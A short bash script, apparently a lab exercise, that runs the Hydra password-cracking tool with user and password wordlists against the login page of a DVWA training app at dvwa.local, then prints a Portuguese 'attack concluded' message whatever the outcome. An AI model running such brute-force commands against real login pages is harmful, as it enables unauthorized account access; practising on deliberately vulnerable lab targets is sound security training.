
#!/usr/bin/env bash
set -e
echo "[INFO] Play 02 — Hydra DVWA"
TARGET="dvwa.local"
hydra -L users.txt -P pass.txt ${TARGET} http-get /login.php || true
echo "[SUCESSO] Ataque concluído"
